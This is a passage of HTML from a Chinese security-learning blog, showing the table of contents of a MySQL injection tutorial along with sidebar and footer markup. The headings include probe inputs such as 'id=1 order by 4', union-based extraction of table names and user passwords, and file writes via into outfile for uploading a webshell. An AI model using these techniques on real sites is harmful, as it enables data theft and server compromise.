href="/2022/04/22/day16web-lou-dong-sql-zhu-ru-zhi-cha-xun-fang-shi-ji-bao-cuo-mang-zhu/" title="Day16web漏洞-SQL注入之查询方式及报错盲注"><img class="cover" src="https://p.ananas.chaoxing.com/star3/origin/4623dee4d25a43ee2e64c3a190e0ef9a.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-22</div><div class="title">Day16web漏洞-SQL注入之查询方式及报错盲注</div></div></a></div><div><a href="/2022/04/23/day17web-lou-dong-sql-zhu-ru-zhi-er-ci-jia-jie-mi-dns-deng-zhu-ru/" title="Day17web漏洞-SQL注入之二次、加解密、DNS等注入"><img class="cover" src="https://p.ananas.chaoxing.com/star3/origin/33f749d952ebf7cfc964fb60576c8e11.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-23</div><div class="title">Day17web漏洞-SQL注入之二次、加解密、DNS等注入</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/111.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">四号街1395</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xxxxx" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E7%9A%84%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.</span> <span class="toc-text">SQL的一般流程步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E6%B3%A8%E5%85%A5%E6%99%AE%E9%80%9A%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">MySQL注入普通流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.</span> <span class="toc-text">收集信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC-version-%E2%80%935-5-44-0ubuntu0-14-04-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">数据库版本 version()    –5.5.44-0ubuntu0.14.04.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E5%AD%97database-%E2%80%93security"><span class="toc-number">1.2.2.</span> <span class="toc-text">数据库名字database()    –security</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7user-root-localhost"><span class="toc-number">1.2.3.</span> <span class="toc-text">数据库用户user()    --root@localhost</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-version-compile-os-%E2%80%93debian-linux-gnu"><span class="toc-number">1.2.4.</span> <span class="toc-text">操作系统@@version_compile_os    –debian-linux-gnu</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9%E2%80%93%E8%BE%93%E5%85%A5id-x3D-1qqq%E6%9F%A5%E8%AF%A2%E6%8A%A5%E9%94%99%EF%BC%8C%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">判断是否存在注入点–输入id&#x3D;1qqq查询报错，存在注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0%E2%80%93id-x3D-1-order-by-4-%E6%8A%A5%E9%94%99%E8%AF%B4%E6%98%8E%E5%AD%98%E5%9C%A83%E5%88%97"><span class="toc-number">1.4.</span> <span class="toc-text">判断列数–id&#x3D;1 order by 4 报错说明存在3列</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E6%8E%A2%E6%B5%8B%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%88%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE%EF%BC%89%E5%8F%91%E7%8E%B0%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE%E5%9C%A82%E5%92%8C3%EF%BC%88%E9%9C%80%E8%A6%81%E8%AE%A9%E5%89%8D%E9%9D%A2%E7%9A%84id%E6%9F%A5%E8%AF%A2%E4%B8%8D%E5%88%B0%E4%BB%8E%E8%80%8C%E6%89%A7%E8%A1%8C%E5%90%8E%E9%9D%A2%E7%9A%84%E8%AF%AD%E5%8F%A5%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">联合注入探测注入点（回显位置）发现回显位置在2和3（需要让前面的id查询不到从而执行后面的语句）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E4%B8%8B%E9%9D%A2%E7%9A%84%E8%A1%A8%E5%90%8D%E4%BF%A1%E6%81%AF%EF%BC%88group-concat-%E6%95%B0%E6%8D%AE%E4%BB%A5%E7%BB%84%E7%9A%84%E5%BD%A2%E5%BC%8F%E6%98%BE%E7%A4%BA%E5%87%BA%E6%9D%A5%EF%BC%89"><span class="toc-number">1.6.</span> <span class="toc-text">利用union联合查询指定数据库名下面的表名信息（group_concat()数据以组的形式显示出来）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E3%80%81%E8%A1%A8%E5%90%8D%EF%BC%8C%E4%B8%8B%E9%9D%A2%E7%9A%84%E5%88%97%E5%90%8D%E4%BF%A1%E6%81%AF"><span class="toc-number">1.7.</span> <span class="toc-text">查询指定数据库名、表名，下面的列名信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-number">1.8.</span> <span class="toc-text">查询用户名和密码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DAY13%E8%A1%A5%E5%85%85"><span class="toc-number">2.</span> <span class="toc-text">DAY13补充</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">2.1.</span> <span class="toc-text">跨库查询的知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8information-schema-schemata%E6%9F%A5%E8%AF%A2%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.2.</span> <span class="toc-text">利用information_schema.schemata查询所有数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%8C%87%E5%AE%9AMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E8%A1%A8"><span class="toc-number">2.3.</span> <span class="toc-text">查询指定MySQL数据库下的所有表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%8C%87%E5%AE%9A%E8%A1%A8users%E4%B8%8B%E9%9D%A2%E7%9A%84%E6%89%80%E6%9C%89%E5%88%97"><span class="toc-number">2.4.</span> <span class="toc-text">查询指定表users下面的所有列</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="toc-number">2.5.</span> <span class="toc-text">查询数据</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C"><span class="toc-number">3.</span> <span class="toc-text">文件读写操作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#load-file-%E2%80%98%E2%80%99-%E8%AF%BB%E5%8F%96%E5%87%BD%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">load_file(‘’)读取函数的应用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#into-outfile-%E5%92%8C-into-dumpfile%E5%87%BD%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%88%E5%8F%AF%E4%BB%A5%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">into outfile 和 into dumpfile函数的应用（可以上传一句话木马）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E5%BC%95%E5%8F%B7%E5%8F%8A%E5%B8%B8%E8%A7%81%E9%98%B2%E6%8A%A4-%EF%BC%88magic-quotes-gpc-x3D-%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">魔术引号及常见防护 （magic_quotes_gpc &#x3D;）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#addslashes-%E5%87%BD%E6%95%B0-%E5%92%8C-is-int%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">addslashes()函数 和 is_int函数</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/06/09/wang-luo-an-quan-yun-ying-bi-ji/" title="网络安全运营笔记"><img src="https://w.wallhaven.cc/full/96/wallhaven-96w8e8.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网络安全运营笔记"/></a><div class="content"><a class="title" href="/2022/06/09/wang-luo-an-quan-yun-ying-bi-ji/" title="网络安全运营笔记">网络安全运营笔记</a><time datetime="2022-06-09T03:05:16.000Z" title="发表于 2022-06-09 11:05:16">2022-06-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/09/yun-ji-suan-gui-na/" title="云计算归纳"><img src="https://w.wallhaven.cc/full/6o/wallhaven-6orjr7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="云计算归纳"/></a><div class="content"><a class="title" href="/2022/06/09/yun-ji-suan-gui-na/" title="云计算归纳">云计算归纳</a><time datetime="2022-06-09T02:13:19.000Z" title="发表于 2022-06-09 10:13:19">2022-06-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/07/wang-luo-cun-chu/" title="网络存储"><img src="https://w.wallhaven.cc/full/e7/wallhaven-e7g71w.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网络存储"/></a><div class="content"><a class="title" href="/2022/06/07/wang-luo-cun-chu/" title="网络存储">网络存储</a><time datetime="2022-06-07T15:26:22.000Z" title="发表于 2022-06-07 23:26:22">2022-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/02/hello-world/" title="Hello World"><img src="https://w.wallhaven.cc/full/pk/wallhaven-pkdol3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2022/06/02/hello-world/" title="Hello World">Hello World</a><time datetime="2022-06-02T07:10:47.387Z" title="发表于 2022-06-02 15:10:47">2022-06-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/23/dian-nao-liang-du-wu-fa-diao-jie-fang-fa/" title="电脑亮度无法调节方法"><img src="https://w.wallhaven.cc/full/pk/wallhaven-pkdol3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="电脑亮度无法调节方法"/></a><div class="content"><a class="title" href="/2022/05/23/dian-nao-liang-du-wu-fa-diao-jie-fang-fa/" title="电脑亮度无法调节方法">电脑亮度无法调节方法</a><time datetime="2022-05-22T20:46:59.000Z" title="发表于 2022-05-23 04:46:59">2022-05-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 四号街1395</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="I,LOVE,雯雯" data-fontsize="20px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
